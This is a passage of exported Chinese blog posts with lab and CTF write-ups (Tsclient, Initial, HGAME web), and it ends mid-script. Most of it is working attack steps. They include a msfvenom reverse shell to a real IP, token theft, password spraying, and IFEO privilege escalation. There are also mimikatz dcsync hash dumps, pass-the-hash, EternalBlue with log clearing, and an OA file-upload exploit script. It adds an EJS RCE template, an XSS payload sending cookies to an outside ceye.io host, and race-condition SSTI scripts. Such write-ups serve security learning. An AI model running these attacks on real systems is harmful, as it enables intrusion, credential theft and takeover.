\u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\r操作成功完成。 管理员权限可以偷RDP用户的token，从而查看其挂载的盘。\n这里可以用msf的incognito模块\nubuntu@VM-20-9-ubuntu:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=106.55.168.231 LPORT=9999 -f exe -o msf.exe\r[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payload\rNo encoder specified, outputting raw payload\rPayload size: 510 bytes\rFinal size of exe file: 7168 bytes\rSaved as: msf.exe 先用msf上个线\nmsfconsole\ruse exploit/multi/handler\rset payload windows/x64/meterpreter/reverse_tcp\rset lhost 106.55.168.231\rset lport 9999\rexploit 上线\n接着用incognito模块偷John的token\n1meterpreter \u0026gt; use incognito 2Loading extension incognito...Success. 3meterpreter \u0026gt; list_tokens -u 4 5Delegation Tokens Available 6======================================== 7IIS APPPOOL\\DefaultAppPool 8NT AUTHORITY\\LOCAL SERVICE 9NT AUTHORITY\\NETWORK SERVICE 10NT AUTHORITY\\SYSTEM 11NT SERVICE\\MsDtsServer130 12NT SERVICE\\MSSQLFDLauncher 13NT SERVICE\\MSSQLSERVER 14NT SERVICE\\MSSQLServerOLAPService 15NT SERVICE\\ReportServer 16NT SERVICE\\SQLTELEMETRY 17NT SERVICE\\SSASTELEMETRY 18NT SERVICE\\SSISTELEMETRY130 19WIN-WEB\\John 20WIN-WEB\\test 21WIN-WEB\\xrntkk 22Window Manager\\DWM-1 23Window Manager\\DWM-2 24Window Manager\\DWM-3 25Window Manager\\DWM-4 26 27Impersonation Tokens Available 28======================================== 29No tokens available 可以看到已经拿到John的token了\n以John的身份运行cmd\n1meterpreter \u0026gt; impersonate_token WIN-WEB\\\\John 2[+] Delegation token available 3[+] Successfully impersonated user WIN-WEB\\John 4meterpreter \u0026gt; shell 5Process 7508 created. 6Channel 1 created. 7... 8 9C:\\Tmp\u0026gt;whoami 10whoami 11win-web\\john net use 看一下挂载情况（不知道为啥我这乱码了）\n挂载了c盘\n查看c盘中的credential.txt文件\nC:\\Tmp\u0026gt;type \\\\TSCLIENT\\C\\credential.txt\rtype \\\\TSCLIENT\\C\\credential.txt\rxiaorang.lab\\Aldrich:Ald@rLMWuy7Z!#\rDo you know how to hijack Image? 这里有一串账号密码，用这串账号密码进行一个密码喷洒\ncrackmapexec -q smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Z!# ┌──(root㉿Xrntkk-Laptop)-[/home/xrntkk]\r└─# proxychains4 -q crackmapexec smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Zproxychains4 crackmapexec smb 172.22.8.0/24\r-u Aldrich -p Ald@rLMWuy7Z\rSMB 172.22.8.18 445 WIN-WEB [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)\rSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.46 445 WIN2016 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)\rSMB 172.22.8.18 445 WIN-WEB [-] WIN-WEB\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.31 445 WIN19-CLIENT [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE 可以看到这三台机貌似都能登上去\nSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False) 我这里选择登31\nproxychains4 rdesktop 172.22.8.31 -u Aldrich -d xiaorang.lab -p \u0026#39;Ald@rLMWuy7Z!#\u0026#39; 这里要用rdesktop登，rdp登不上\n会提示密码过期，改个密码就行了\n但是改完密码这台机还是登不上，没有登陆权限\n所以我们尝试用这个修改后的账号密码再去登这个账号的另一台机子\n成功在46中登入，后面还是用rdp吧，rdesktop也太卡了\nxiaorang.lab\\Aldrich\rAbc123456 FLAG2 信息收集一下\n可以看到我们已经拿下域内的一台机子了\nsysteminfo 这台机子不出网，我们可以通过共享文件夹的方式来传文件\n这里我是用第一台机子(172.22.8.18)，将文件夹C:/xrntkk共享给(172.22.8.46)\n在46上Win+R并输入\n\\\\172.22.8.18 输入18共享文件的账号密码即可\n接着我们用bloodhound来进行一下域内信息收集\nSharpHound.exe -c all 将数据采集完生成的zip文件，上传导入到BloodHound分析\n从图中，我们会发现46这台机子的用户是域管，那我们接下来就要想办法在这台机子上提权，然后拿下域控\n根据前面的hint\nDo you know how to hijack Image? 我们可以知道接下来要进行镜像劫持(IFEO)提权\nGet-ACL -Path \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\u0026#34; | fl 这条命令的意思是获取指定注册表路径的访问控制列表（ACL）。\nNT AUTHORITY\\Authenticated Users 我们可以发现全部已登录用户都可以对注册表进行修改\n那我们就可以通过修改注册表进行映像劫持\n我们这里通过将放大镜启动的magnify.exe替换成C:\\windows\\system32\\cmd.exe，来进行提权\n1REG ADD \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\u0026#34; /v Debugger /t REG_SZ /d \u0026#34;C:\\windows\\system32\\cmd.exe\u0026#34; 修改后选择锁定\n在锁定页面选择放大镜即可\ntype c:\\Users\\Administrator\\flag\\flag02.txt 接着我们可以新建一个用户让rdp可以连上去\nFLAG3 接下来就是常规的将域内用户的哈希dump下来\nmimikatz.exe \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit \u0026gt; mimikatz.txt 结果\n.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\r.## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo)\r## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\r## \\ / ## \u0026gt; https://blog.gentilkiwi.com/mimikatz\r\u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com )\r\u0026#39;#####\u0026#39; \u0026gt; https://pingcastle.com / https://mysmartlogon.com ***/\rmimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv\r[DC] \u0026#39;xiaorang.lab\u0026#39; will be the domain\r[DC] \u0026#39;DC01.xiaorang.lab\u0026#39; will be the DC server\r[DC] Exporting domain \u0026#39;xiaorang.lab\u0026#39;\r[rpc] Service : ldap\r[rpc] AuthnSvc : GSS_NEGOTIATE (9)\r502\tkrbtgt\t3ffd5b58b4a6328659a606c3ea6f9b63\t514\r1000\tDC01$\t7408967f1fd3c2ff807232b7b5c5fc95\t532480\r500\tAdministrator\t2c9d81bdcf3ec8b1def10328a7cc2f08\t512\r1103\tWIN2016$\taae3dca76f254c52708ee076935bb533\t16781312\r1104\tWIN19-CLIENT$\t7c011200ecbe666945e465c200afcb5e\t16781312\r1105\tAldrich\t0607f770c2f37e09a850e09e920a9f45\t512\rmimikatz(commandline) # exit\rBye! 之后就可以进行横向移动了\nproxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk type c:\\users\\administrator\\flag\\flag03.txt 拿到最后一个flag\nC:\\Windows\\system32\u0026gt;type c:\\users\\administrator\\flag\\flag03.txt\r_________ __ _ _\r| _ _ | [ | (_) / |_\r|_/ | | \\_|.--. .---. | | __ .---. _ .--. `| |-\u0026#39;\r| | ( (`\\] / /\u0026#39;`\\] | | [ |/ /__\\\\[ `.-. | | |\r_| |_ `\u0026#39;.\u0026#39;. | \\__. | | | || \\__., | | | | | |,\r|_____| [\\__) )\u0026#39;.___.\u0026#39;[___][___]\u0026#39;.__.\u0026#39;[___||__]\\__/\rCongratulations! ! !\rflag03: flag{410202d3-2e47-4619-a6b0-96051a985f2e} 这题用cs打会方便很多，但是一开始没考虑到，所以后面也一直没用。\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/","summary":"\u003cp\u003eTsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。\u003c/p\u003e","title":"春秋云镜-Tsclient-Writeup"},{"content":" 参考文章\nhttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\n菜鸡第一个通关的靶场Orz\nFLAG1 fscan扫一下\n./fscan.exe -h 39.99.139.119 直接用thinkphpgui写马连蚁剑\n先用vshell上线\n读flag需要提权\npeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\n传个linpeas扫一下\n./linpeas_linux_amd64 \u0026gt; output.txt 在历史文件中找到疑似读flag的命令\n其实这就是一个简单的sudo提权\n渗透测试：Linux提权精讲（三）之sudo方法第三期_nmap sudo 提权-CSDN博客\nmysql 是配置了 sudo 免密使用的，可以使用 mysql 提权，通过mysql执行命令来读flag\npayload:\nsudo mysql -e \u0026#39;\\! /bin/sh\u0026#39;\rcat /root/flag/flag* flag01: flag{60b53231- 接下来搭代理\n查内网ip\n接着传一个fscan扫一下内网\nfs -h 172.22.1.0/24 -nobr -nopoc -hn 172.22.1.15 收集到的信息\n172.22.1.2:DC域控\r172.22.1.21:Windows的机器并且存在MS17-010 漏洞\r172.22.1.18:信呼OA办公系统 FLAG2 先看信呼\n弱口令成功登入admin/admin123\n信呼协同办公系统v2.2.8存在文件上传漏洞\n[Awesome-POC/OA产品漏洞/信呼OA qcloudCosAction.php 任意文件上传漏洞.md at master · Threekiii/Awesome-POC](https://github.com/Threekiii/Awesome-POC/blob/master/OA产品漏洞/信呼OA qcloudCosAction.php 任意文件上传漏洞.md)\n1import requests 2 3session = requests.session() 4url_pre = \u0026#39;http://172.22.1.18/\u0026#39; 5url1 = url_pre + \u0026#39;?a=check\u0026amp;m=login\u0026amp;d=\u0026amp;ajaxbool=true\u0026amp;rnd=533953\u0026#39; 6url2 = url_pre + \u0026#39;/index.php?a=upfile\u0026amp;m=upload\u0026amp;d=public\u0026amp;maxsize=100\u0026amp;ajaxbool=true\u0026amp;rnd=798913\u0026#39; 7# url3 = url_pre + \u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid=\u0026lt;ID\u0026gt;\u0026#39; 8data1 = { 9 \u0026#39;rempass\u0026#39;: \u0026#39;0\u0026#39;, 10 \u0026#39;jmpass\u0026#39;: \u0026#39;false\u0026#39;, 11 \u0026#39;device\u0026#39;: \u0026#39;1625884034525\u0026#39;, 12 \u0026#39;ltype\u0026#39;: \u0026#39;0\u0026#39;, 13 \u0026#39;adminuser\u0026#39;: \u0026#39;YWRtaW4=\u0026#39;, 14 \u0026#39;adminpass\u0026#39;: \u0026#39;YWRtaW4xMjM=\u0026#39;, 15 \u0026#39;yanzm\u0026#39;: \u0026#39;\u0026#39; 16} 17 18r = session.post(url1, data=data1) 19r = session.post(url2, files={\u0026#39;file\u0026#39;: open(\u0026#39;1.php\u0026#39;, \u0026#39;r\u0026#39;)}) 20filepath = str(r.json()[\u0026#39;filepath\u0026#39;]) 21filepath = \u0026#34;/\u0026#34; + filepath.split(\u0026#39;.uptemp\u0026#39;)[0] + \u0026#39;.php\u0026#39; 22print(filepath) 23id = r.json()[\u0026#39;id\u0026#39;] 24url3 = url_pre + f\u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid={id}\u0026#39; 25r = session.get(url3) 26r = session.get(url_pre + filepath + \u0026#34;?1=system(\u0026#39;dir\u0026#39;);\u0026#34;) 27print(r.text) 写马之后直接读flag就行\nflag02: 2ce3-4813-87d4- FLAG3 永恒之蓝可以用msf打\n现在kali上用proxychains4简单配个代理\nproxychains4 msfconsole\rsearch ms17-010 有四个不同的模块\n这里使用第一个模块，因为利用范围比较广\nuse exploit/windows/smb/ms17_010_eternalblue # 选择使用的模块\rset payload windows/x64/meterpreter/bind_tcp_uuid # 设置payload，可以通过show payloads查看\rset RHOSTS 172.22.1.21 # 设置靶机的ip\rexploit # 发起攻击 成功了\nmeterpreter \u0026gt; screenshot # 捕获屏幕\rmeterpreter \u0026gt; upload hello.txt c:// #上传文件\rmeterpreter \u0026gt; download d://1.txt # 下载文件\rmeterpreter \u0026gt; shell # 获取cmd\rmeterpreter \u0026gt; clearev # 清除日志 load kiwi # 调用mimikatz模块\rkiwi_cmd \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit # 导出域内所有用户的信息(包括哈希值) 拿到Administrator 用户的 hash，接着使用 crackmapexec 来进行哈希传递攻击，来实现 DC域控 上的任意命令执行\nproxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x \u0026#34;type Users\\Administrator\\flag\\flag03.txt\u0026#34; 拿到最后一个flag\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial-writeup/","summary":"\u003cblockquote\u003e\n\u003cp\u003e参考文章\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\"\u003ehttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e菜鸡第一个通关的靶场Orz\u003c/p\u003e\n\u003ch3 id=\"flag1\"\u003eFLAG1\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306184027336\" loading=\"lazy\" src=\"../assets/image-20250306184027336.png\"\u003e\u003c/p\u003e\n\u003cp\u003efscan扫一下\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e./fscan.exe -h 39.99.139.119\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg alt=\"image-20250306184106697\" loading=\"lazy\" src=\"../assets/image-20250306184106697.png\"\u003e\u003c/p\u003e\n\u003cp\u003e直接用thinkphpgui写马连蚁剑\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306185409381\" loading=\"lazy\" src=\"../assets/image-20250306185409381.png\"\u003e\u003c/p\u003e\n\u003cp\u003e先用vshell上线\u003c/p\u003e\n\u003cp\u003e读flag需要提权\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/peass-ng/PEASS-ng\"\u003epeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\u003c/a\u003e\u003c/p\u003e","title":"春秋云镜-Initial-Writeup"},{"content":"Web week1 Level 24 Pacman 拿到环境\n一个小游戏，猜测应该是js审计\n查看index.js发现代码进行了混淆\n可以用工具反混淆一下，增加一下可读性\nhttps://tool.yuanrenxue.cn/decode_obfuscator\n反混淆之后找到这个\n感觉是栅栏，解密拿到flag\nLevel 47 BandBomb 文件上传\n附件有源码\n1const express = require(\u0026#39;express\u0026#39;); 2const multer = require(\u0026#39;multer\u0026#39;); 3const fs = require(\u0026#39;fs\u0026#39;); 4const path = require(\u0026#39;path\u0026#39;); 5 6const app = express(); 7 8app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); 9 10app.use(\u0026#39;/static\u0026#39;, express.static(path.join(__dirname, \u0026#39;public\u0026#39;))); 11app.use(express.json()); 12 13const storage = multer.diskStorage({ 14 destination: (req, file, cb) =\u0026gt; { 15 const uploadDir = \u0026#39;uploads\u0026#39;; 16 if (!fs.existsSync(uploadDir)) { 17 fs.mkdirSync(uploadDir); 18 } 19 cb(null, uploadDir); 20 }, 21 filename: (req, file, cb) =\u0026gt; { 22 cb(null, file.originalname); 23 } 24}); 25 26const upload = multer({ 27 storage: storage, 28 fileFilter: (_, file, cb) =\u0026gt; { 29 try { 30 if (!file.originalname) { 31 return cb(new Error(\u0026#39;无效的文件名\u0026#39;), false); 32 } 33 cb(null, true); 34 } catch (err) { 35 cb(new Error(\u0026#39;文件处理错误\u0026#39;), false); 36 } 37 } 38}); 39 40app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { 41 const uploadsDir = path.join(__dirname, \u0026#39;uploads\u0026#39;); 42 43 if (!fs.existsSync(uploadsDir)) { 44 fs.mkdirSync(uploadsDir); 45 } 46 47 fs.readdir(uploadsDir, (err, files) =\u0026gt; { 48 if (err) { 49 return res.status(500).render(\u0026#39;mortis\u0026#39;, { files: [] }); 50 } 51 res.render(\u0026#39;mortis\u0026#39;, { files: files }); 52 }); 53}); 54 55app.post(\u0026#39;/upload\u0026#39;, (req, res) =\u0026gt; { 56 upload.single(\u0026#39;file\u0026#39;)(req, res, (err) =\u0026gt; { 57 if (err) { 58 return res.status(400).json({ error: err.message }); 59 } 60 if (!req.file) { 61 return res.status(400).json({ error: \u0026#39;没有选择文件\u0026#39; }); 62 } 63 res.json({ 64 message: \u0026#39;文件上传成功\u0026#39;, 65 filename: req.file.filename 66 }); 67 }); 68}); 69 70app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 71 const { oldName, newName } = req.body; 72 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 73 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 74 75 if (!oldName || !newName) { 76 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 77 } 78 79 fs.rename(oldPath, newPath, (err) =\u0026gt; { 80 if (err) { 81 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 82 } 83 res.json({ message: \u0026#39; \u0026#39; }); 84 }); 85}); 86 87app.listen(port, () =\u0026gt; { 88 console.log(`服务器运行在 http://localhost:${port}`); 89}); 这题有点像24国赛的ezjs\n文章 - 对ejs引擎漏洞及函数特性的利用 - 先知社区\n可以看到在 /rename 路由\n1app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 2 const { oldName, newName } = req.body; 3 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 4 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 5 6 if (!oldName || !newName) { 7 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 8 } 9 10 fs.rename(oldPath, newPath, (err) =\u0026gt; { 11 if (err) { 12 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 13 } 14 res.json({ message: \u0026#39; \u0026#39; }); 15 }); 16}); 这个路由会将uploads目录中的文件重命名\n我们可以利用这个路由，通过目录穿越对任意文件进行移动和重命名\n也就是说我们可以通过上传恶意的ejs到uploads目录，接着通过/rename路由将我们上传的恶意ejs文件覆写掉/路由的模板文件mortis.ejs实现RCE\neval.ejs\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;whoami\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 将ejs上传\n覆写原来的ejs\n访问/\n这题flag藏在环境变量里\npayload:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;printenv\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Level 69 MysteryMessageBoard 密码爆破，XSS cookie窃取\n爆出来 shallot/888888\n登进去看到一个留言板\n猜测是xss，测试一下\n\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt; 同时通过dirsearch扫到了/admin路由\n根据这句话大概可以猜到，访问/admin路由的时候应该会在后端以admin的身份来访问留言板\n也就是说我们可以进行cookie窃取\npayload:\n\u0026lt;script\u0026gt;document.location=\u0026#39;http://dfny33.ceye.io?\u0026#39;+document.cookie;\u0026lt;/script\u0026gt; 将payload输出在留言板，然后访问/admin\n成功拿到admin的cookie\n拿admin的cookie访问/flag即可拿到flag\nLevel 25 双面人派对 这道题有两个环境，一开始以为是re，其实感觉更像是misc\n访问app.service-web可以拿到一个main文件\n是一个elf文件\n用exeinfo PE查到用upx加壳了\n用upx官方工具就可以脱壳\nhttps://github.com/upx/upx/releases/latest\n脱壳之后用ida打开\n可以找到一段关于minio的密钥信息\n.noptrdata:0000000000D614E0\t000000AA\tC\tminio:\\r\\n endpoint: \\\u0026#34;127.0.0.1:9000\\\u0026#34;\\r\\n access_key: \\\u0026#34;minio_admin\\\u0026#34;\\r\\n secret_key: \\\u0026#34;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=\\\u0026#34;\\r\\n bucket: \\\u0026#34;prodbucket\\\u0026#34;\\r\\n key: \\\u0026#34;update\\\u0026#34; 那我们大概就能猜到另一个环境应该就是这个minio的服务\n用mc通过Access Key和Secret Key连接上去\n里面有两个储存桶\n将两个储存桶都下载下来\n/hints里面放的是8080服务的源码，/prodbucket里面是源码编译后的文件叫做update，猜测是热更新\n看一下源码\n1package main 2 3import ( 4\t\u0026#34;level25/fetch\u0026#34; 5\t\u0026#34;level25/conf\u0026#34; 6\t\u0026#34;github.com/gin-gonic/gin\u0026#34; 7\t\u0026#34;github.com/jpillora/overseer\u0026#34; 8) 9 10func main() { 11\tfetcher := \u0026amp;fetch.MinioFetcher{ 12\tBucket: conf.MinioBucket, 13\tKey: conf.MinioKey, 14\tEndpoint: conf.MinioEndpoint, 15\tAccessKey: conf.MinioAccessKey, 16\tSecretKey: conf.MinioSecretKey, 17\t} 18\toverseer.Run(overseer.Config{ 19\tProgram: program, 20\tFetcher: fetcher, 21\t}) 22 23} 24 25func program(state overseer.State) { 26\tg := gin.Default() 27\tg.StaticFS(\u0026#34;/\u0026#34;, gin.Dir(\u0026#34;.\u0026#34;, true)) 28\tg.Run(\u0026#34;:8080\u0026#34;) 29} 我们可以猜测/路由展示的这个.目录就是前面我们下周main文件的目录\n我们可以把.改成根目录/，然后将编译后的源码覆写掉原来的update，热更新后，我们就能直接访问根目录了\npayload:\npackage main import ( \u0026#34;level25/fetch\u0026#34; \u0026#34;level25/conf\u0026#34; \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;github.com/jpillora/overseer\u0026#34; ) func main() { fetcher := \u0026amp;fetch.MinioFetcher{ Bucket: conf.MinioBucket, Key: conf.MinioKey, Endpoint: conf.MinioEndpoint, AccessKey: conf.MinioAccessKey, SecretKey: conf.MinioSecretKey, } overseer.Run(overseer.Config{ Program: program, Fetcher: fetcher, }) } func program(state overseer.State) { g := gin.Default() g.StaticFS(\u0026#34;/abc\u0026#34;, gin.Dir(\u0026#34;/\u0026#34;, true)) g.Run(\u0026#34;:8080\u0026#34;) } 这里我将/路由改成了/abc，因为不知道为啥我用/路由不行\n将源码编译后覆写到储存桶上\n访问/abc\n拿到flag\nLevel 38475 角落 ssti/条件竞争\n/robots.txt有个/app.conf\n访问/app.conf\n这里展示了httpd.conf的片段\n这里给出了源码的位置还有一个重写引擎的规则，猜测应该是该版本的apache存在源码泄露\n同时在响应标头能找到Apache的版本信息\n可以找到这个版本的apache存在源码泄露，而且是跟重写规则有关\nCVE-2024-38475\n网上没找到什么poc\n但是可以找到漏洞发现者的一篇文章\nhttps://blog.orange.tw/posts/2024-08-confusion-attacks-en/\n根据这篇文章我们可以构造出paylaod\nhttp://node1.hgame.vidar.club:31155/admin/usr/local/apache2/app/app.py%3F 这道题多了一个RewriteCond \u0026ldquo;%{HTTP_USER_AGENT}\u0026rdquo; \u0026ldquo;^L1nk/\u0026rdquo;，只需要在user-agent前面加上L1nk/即可\n拿到源码\n1from flask import Flask, request, render_template, render_template_string, redirect 2import os 3import templates 4 5app = Flask(__name__) 6pwd = os.path.dirname(__file__) 7show_msg = templates.show_msg 8 9 10def readmsg(): 11\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 12\tif os.path.exists(filename): 13\tf = open(filename, \u0026#39;r\u0026#39;) 14\tmessage = f.read() 15\tf.close() 16\treturn message 17\telse: 18\treturn \u0026#39;No message now.\u0026#39; 19 20 21@app.route(\u0026#39;/index\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 22def index(): 23\tstatus = request.args.get(\u0026#39;status\u0026#39;) 24\tif status is None: 25\tstatus = \u0026#39;\u0026#39; 26\treturn render_template(\u0026#34;index.html\u0026#34;, status=status) 27 28 29@app.route(\u0026#39;/send\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) 30def write_message(): 31\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 32\tmessage = request.form[\u0026#39;message\u0026#39;] 33 34\tf = open(filename, \u0026#39;w\u0026#39;) 35\tf.write(message) 36\tf.close() 37 38\treturn redirect(\u0026#39;index?status=Send successfully!!\u0026#39;) 39\t40@app.route(\u0026#39;/read\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 41def read_message(): 42\tif \u0026#34;{\u0026#34; not in readmsg(): 43\tshow = show_msg.replace(\u0026#34;{{message}}\u0026#34;, readmsg()) 44\treturn render_template_string(show) 45\treturn \u0026#39;waf!!\u0026#39; 46\t47 48if __name__ == \u0026#39;__main__\u0026#39;: 49\tapp.run(host = \u0026#39;0.0.0.0\u0026#39;, port = 5000) 可以看到/read路由存在ssti，但是他waf掉了最重要的{\n但是可以看到这个/send路由会将传入的信息写入message.txt文件，在访问/read路由的时候则会读取message.txt文件。这么一来我们就可以考虑通过竞争的方式来绕过waf了。竞争思路大概就是我在很短的时间内连续发送两条信息，第一条信息是合法信息，而第二条信息是不合法的，那么就会存在一种情况，当第一条信息通过了判断，接下来要将文件的内容插入到模板中渲染的时候，刚好第二条不合法的信息覆写了message.txt，那么插入模板中的就是第二条不合法的信息了\n接下来就是搓脚本发包\n三个脚本\npoc1\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;{{config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;cat /flag\u0026#39;).read()}}\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) 8 poc2\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like 